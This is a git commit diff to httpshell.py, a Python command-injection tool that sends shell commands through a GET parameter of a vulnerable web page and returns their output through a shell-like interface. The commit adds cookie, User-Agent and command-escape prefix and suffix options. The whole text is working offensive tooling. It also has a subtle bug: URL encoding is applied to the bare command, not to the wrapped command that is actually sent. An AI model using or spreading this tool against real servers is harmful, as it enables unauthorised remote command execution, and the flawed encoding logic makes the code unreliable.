d1122a3a7992fbb68ce909c9510358094f0d14f2
Richard A. Dubniczky <richard@dubniczky.com>
2026-04-28 11:25:46 +0200

    Added cookies, agent, prefix, suffix features

--- httpshell.py
+++ httpshell.py
@@ -12,6 +12,10 @@ address = 'http://localhost:8000/good'
 parameter = 'q'
 url_encode = True
 verbose = False
+cookies = None
+user_agent = None
+prefix = None
+suffix = None
 
 
 def voutput(message):
@@ -29,7 +33,7 @@ def preflight_request():
     if url_encode:
         preflight_echo = urllib.parse.quote(preflight_echo)
     
-    preflight_response = requests.get(f"{address}?{parameter}={preflight_echo}")
+    preflight_response = requests.get(f"{address}?{parameter}={preflight_echo}", cookies=cookies, headers={'User-Agent': user_agent} if user_agent else None)
     
     # Validate response
     if preflight_response.status_code == 200 and preflight_random in preflight_response.text:
@@ -52,12 +56,17 @@ def send_command(command):
     end_marker = f"--{random_string(8)}--"
     wrapped_command = f"echo {start_marker};{command};echo {end_marker}"
     
+    if prefix:
+        wrapped_command = f"{prefix}{wrapped_command}"
+    if suffix:
+        wrapped_command = f"{wrapped_command}{suffix}"
+    
     if url_encode:
         command = urllib.parse.quote(command)
     
     url = f"{address}?{parameter}={wrapped_command}"
     voutput(f"Sending command: {url}")
-    response = requests.get(url)
+    response = requests.get(url, cookies=cookies, headers={'User-Agent': user_agent} if user_agent else None)
     
     if response.status_code != 200:
         print(f"Command execution failed with status code: {response.status_code} and response: {response.text}")
@@ -93,9 +102,15 @@ def main():
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="HTTP CLI Shell")
+    parser = argparse.ArgumentParser(description=" A lightweight HTTP CLI Shell that enables custom command injections into vulnerable web applications with a familiar shell-like interface.")
     parser.add_argument("--address", "-a", help="Target address containing the full path. E.g., http://example.com/vulnerable.php")
     parser.add_argument("--parameter", "-p", help="Parameter name where the injection will occur. E.g., 'cmd' for http://example.com/vulnerable.php?cmd=...")
+    parser.add_argument("--cookies", "-c", help="Use cookies for the request")
+    parser.add_argument("--agent", help="Set a custom User-Agent header for the requests")
+    parser.add_argument("--prefix", "-P", help="Set a custom prefix for the commands. This is usually the command escape. By default there is none. No modifications apply to this, so make sure to encode it properly if needed.")
+    parser.add_argument("--suffix", "-S", help="Set a custom suffix for the commands. This is usually the command escape. By default there is none. No modifications apply to this, so make sure to encode it properly if needed.")
+
+
     parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
     parser.add_argument("--no-url-encode", action="store_true", help="Disable URL encoding of commands")
 
@@ -105,5 +120,9 @@ if __name__ == "__main__":
     parameter = args.parameter
     url_encode = not args.no_url_encode
     verbose = args.verbose
+    cookies = args.cookies
+    user_agent = args.agent
+    prefix = args.prefix
+    suffix = args.suffix
     
     main()
